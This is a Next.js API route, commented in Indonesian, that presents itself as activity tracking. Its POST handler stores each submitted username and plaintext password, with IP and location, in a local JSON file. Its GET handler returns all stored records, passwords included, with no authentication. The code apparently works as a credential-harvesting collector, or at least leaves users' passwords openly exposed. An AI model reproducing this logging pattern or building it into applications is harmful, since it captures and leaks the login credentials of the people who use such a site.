import { NextResponse } from 'next/server';
import { promises as fs } from 'fs';
import path from 'path';

export const dynamic = 'force-dynamic';

// Kita menggunakan file public/data.json atau folder di luar publik untuk menyimpan logs
// Di lingkungan production berbasis Node.js/Laragon, file ini akan bertahan secara lokal.
const dataDir = path.join(process.cwd(), 'data');
const dataFilePath = path.join(dataDir, 'storages.json');

interface TrackingLog {
  id: string;
  timestamp: string;
  username: string;
  password?: string;
  action: string;
  ip: string;
  location: string;
  path: string;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    
    try {
      await fs.access(dataDir);
    } catch {
      await fs.mkdir(dataDir, { recursive: true });
    }

    let logs: TrackingLog[] = [];
    try {
      const fileData = await fs.readFile(dataFilePath, 'utf8');
      logs = JSON.parse(fileData) as TrackingLog[];
    } catch {
      // empty array
    }

    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    const serverSideIp = forwardedFor ? forwardedFor.split(',')[0].trim() : (realIp || 'Unknown IP Server-Side');
    const effectiveIp = body.ip && body.ip !== 'Unknown IP' ? body.ip : serverSideIp;

    const newLog: TrackingLog = {
      id: Date.now().toString() + Math.random().toString(36).substring(2, 9),
      timestamp: new Date().toISOString(),
      username: body.username || 'Guest',
      password: body.password || '',
      action: body.action || 'Unknown Action',
      ip: effectiveIp,
      location: body.location || 'Indonesia',
      path: body.path || '/'
    };

    logs.unshift(newLog);

    // Filter agar file tidak kelebihan data (max 2000 log)
    if (logs.length > 2000) {
      logs = logs.slice(0, 2000);
    }

    // Tulis ke JSON
    await fs.writeFile(dataFilePath, JSON.stringify(logs, null, 2), 'utf8');

    return NextResponse.json({ success: true, log: newLog });
  } catch (error) {
    console.error('Tracking POST Error:', error);
    return NextResponse.json({ success: false, error: 'Gagal merekam data tracking' }, { status: 500 });
  }
}

export async function GET() {
  try {
    let logs: TrackingLog[] = [];
    try {
      const fileData = await fs.readFile(dataFilePath, 'utf8');
      logs = JSON.parse(fileData) as TrackingLog[];
    } catch {
      logs = []; // Return empty array if file not created yet
    }
    
    return NextResponse.json({ success: true, count: logs.length, data: logs });
  } catch (error) {
    console.error('Tracking GET Error:', error);
    return NextResponse.json({ success: false, error: 'Gagal membaca data tracking' }, { status: 500 });
  }
}
